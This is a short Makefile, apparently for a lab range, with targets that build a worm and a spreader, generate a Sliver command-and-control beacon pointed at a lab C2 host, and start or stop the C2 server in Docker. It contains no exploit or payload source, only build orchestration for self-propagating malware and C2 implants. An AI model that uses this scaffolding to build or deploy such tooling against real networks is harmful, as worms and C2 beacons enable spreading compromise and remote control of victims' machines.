SHELL := /bin/bash
C2_HOST ?= c2.lab.local
PROFILE := sliver/profiles/worm-mtls.json

.PHONY: all build spreader beacon c2-up c2-down clean teardown

all: build

build:
	cmake -S src/worm -B build/worm -DCMAKE_BUILD_TYPE=Release
	cmake --build build/worm -j

spreader:
	cmake -S src/spreader -B build/spreader -DCMAKE_BUILD_TYPE=Release
	cmake --build build/spreader -j

beacon:
	C2_HOST=$(C2_HOST) bash sliver/scripts/gen-beacon.sh

c2-up:
	docker compose -f lab/docker-compose.yml up -d
	@echo "C2 up — check: docker logs -f worm-c2"

c2-down:
	docker compose -f lab/docker-compose.yml down

clean:
	rm -rf build payloads/*.bin payloads/*.exe payloads/*.elf

teardown: c2-down
	bash teardown.sh